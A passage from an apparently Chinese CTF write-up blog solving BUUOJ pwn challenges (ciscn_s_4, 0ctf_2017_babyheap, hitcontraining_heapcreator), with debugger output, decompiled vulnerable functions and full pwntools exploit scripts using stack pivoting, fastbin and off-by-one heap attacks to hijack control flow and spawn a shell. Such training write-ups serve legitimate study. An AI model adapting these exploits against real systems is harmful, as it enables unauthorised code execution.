class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> ESP  0xffffd074 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EIP  0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x80485fc  &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd  &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe  &lt;vul+105&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x80484b8  &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9  &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line"> ► 0x8048400  &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406  &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b  &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    ↓</span><br><span class="line">   0x80483c0                               push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x80483c6                               jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;        push   eax</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd074 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">01:0004│      0xffffd078 —▸ 0xffffd07c ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">02:0008│      0xffffd07c ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">03:000c│      0xffffd080 ◂— 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">04:0010│      0xffffd084 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27655</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./ciscn_s_4&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_s_4&quot;</span>)</span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">buf_add = ebp - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">payload = p32(sys_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(buf_add+<span class="number">12</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;a&#x27;</span> + p32(buf_add-<span class="number">4</span>) + p32(leave)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;aaaa&#x27;+p32(sys_addr) + &#x27;aaaa&#x27; + p32(buf_add+16) + b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment">#payload += (0x28 - len(payload))* b&#x27;a&#x27; + p32(buf_add) + p32(leave)</span></span><br><span class="line"><span class="comment">#两个payload都可以，意思都一样</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3B-0ctf-2017-babyheap"><a href="#0x3B-0ctf-2017-babyheap" class="headerlink" title="0x3B.0ctf_2017_babyheap"></a>0x3B.0ctf_2017_babyheap</h1><p>这题重复了，前面有个一样的。</p><p>当unsortedbin只有一个时，他的fd和bk指向<code>main_arena + 0x58</code>，而且 main_arena 又相对 libc 固定偏移 0x3c4b20，所以得到的内容减去0x3c4b78就是libc的基地址</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./0ctf_2017_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26377</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)<span class="comment">#allocate</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)<span class="comment">#free</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#5 topchunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) +p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#1 --&gt;2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#2 --&gt;4</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: \n&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) -  <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> +p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3C-hitcontraining-heapcreator"><a href="#0x3C-hitcontraining-heapcreator" class="headerlink" title="0x3C.hitcontraining_heapcreator"></a>0x3C.hitcontraining_heapcreator</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;heaparray)[i] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = (&amp;heaparray)[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;heaparray)[i] = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input((&amp;heaparray)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请的首个0x10，前0x8放size，后半部分放申请的size的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input((&amp;heaparray)[v1][<span class="number">1</span>], *(&amp;heaparray)[v1] + <span class="number">1</span>);<span class="comment">//这里存在off by one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1][<span class="number">1</span>]);<span class="comment">//free mallocsize)</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1]); <span class="comment">//free 0x10</span></span><br><span class="line">    (&amp;heaparray)[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：利用edit的off by one ，覆写size，然后free掉，再申请，填充payload，将free的got打印出来，覆写free的地址为system的地址，然后delete即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br></pre></td></tr></table></figure><p>覆写掉第二次的0x10的size位为0x81;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">8</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_add = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>将free的地址打印出来；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(system_add))</span><br></pre></td></tr></table></figure><p>这里是将malloc的地址的地址改为system的地址，再之后free的时候就转为执行system.</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28078</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;heapcreator&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">length,value</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">io.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,value</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">io.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">8</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_add = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">base = free_add - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_add))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3D-wustctf2020-closed"><a href="#0x3D-wustctf2020-closed" class="headerlink" title="0x3D.wustctf2020_closed"></a>0x3D.wustctf2020_closed</h1><p>感觉挺有意思的一个题，考的不是pwn的知识，应该是Linux相关的知识</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">vulnerable</span><span 